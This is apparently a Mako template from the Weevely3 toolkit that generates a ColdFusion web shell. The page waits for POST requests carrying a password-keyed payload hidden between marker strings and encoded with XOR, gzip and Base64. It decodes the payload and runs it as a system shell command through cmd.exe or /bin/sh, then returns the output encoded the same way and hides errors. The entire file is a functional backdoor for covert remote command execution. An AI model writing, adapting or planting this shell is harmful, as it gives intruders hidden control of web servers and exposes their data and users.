<%! import hashlib, weevely, string %>
<%
passwordhash = hashlib.md5(password.encode('utf-8')).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
PREPEND = weevely.utils.strings.randstr(16, charset = string.digits + string.ascii_letters).decode('utf-8')
%>
<cfsetting enablecfoutputonly="yes">
<cfprocessingdirective pageencoding="utf-8">
<cfscript>
    // Weevely3 ColdFusion Agent
    // Implements XOR -> GZIP -> Base64 protocol

    function xor(text, key) {
        var sb = createObject("java", "java.lang.StringBuilder").init();
        var i = 0;
        var klen = len(key);
        
        for (i = 0; i < len(text); i++) {
            sb.append(chr(bitXor(asc(mid(text, i+1, 1)), asc(mid(key, (i % klen) + 1, 1)))));
        }
        return sb.toString();
    }

    function streamToString(is) {
        var scanner = createObject("java", "java.util.Scanner").init(is, "ISO-8859-1").useDelimiter("\\A");
        if (scanner.hasNext()) {
            return scanner.next();
        }
        return "";
    }

    k = "${key}";
    kh = "${header}";
    kf = "${footer}";
    p = "${PREPEND}";

    if (cgi.request_method eq "POST") {
        try {
            // Read raw body
            content = getHttpRequestData().content;
            if (isBinary(content)) {
                content = charsetEncode(content, "ISO-8859-1");
            }
            
            start = find(kh, content);
            end = find(kf, content);

            if (start > 0 and end > 0) {
                payload = mid(content, start + len(kh), end - (start + len(kh)));

                // Decode: Base64 -> XOR -> Gunzip
                decodedBytes = binaryDecode(payload, "Base64");
                xorred = charsetEncode(decodedBytes, "ISO-8859-1");
                unxorred = xor(xorred, k);

                // Gunzip
                bais = createObject("java", "java.io.ByteArrayInputStream").init(charsetDecode(unxorred, "ISO-8859-1"));
                gzis = createObject("java", "java.util.zip.GZIPInputStream").init(bais);
                cmd = streamToString(gzis);

                // Execute Command
                runtime = createObject("java", "java.lang.Runtime").getRuntime();
                
                os = createObject("java", "java.lang.System").getProperty("os.name");
                if (findNoCase("win", os) > 0) {
                    proc = runtime.exec(["cmd.exe", "/c", cmd]);
                } else {
                    proc = runtime.exec(["/bin/sh", "-c", cmd]);
                }
                
                stdin = proc.getInputStream();
                stderr = proc.getErrorStream();
                output = streamToString(stdin) & streamToString(stderr);

                // Encode: Gzip -> XOR -> Base64
                baos = createObject("java", "java.io.ByteArrayOutputStream").init();
                gzos = createObject("java", "java.util.zip.GZIPOutputStream").init(baos);
                gzos.write(charsetDecode(output, "ISO-8859-1"));
                gzos.close();
                
                compressed = baos.toString("ISO-8859-1");
                reXorred = xor(compressed, k);
                encoded = binaryEncode(charsetDecode(reXorred, "ISO-8859-1"), "Base64");

                writeOutput(p & kh & encoded & kf);
            }
        } catch (any e) {
            // writeOutput(e.message);
        }
    }
</cfscript>
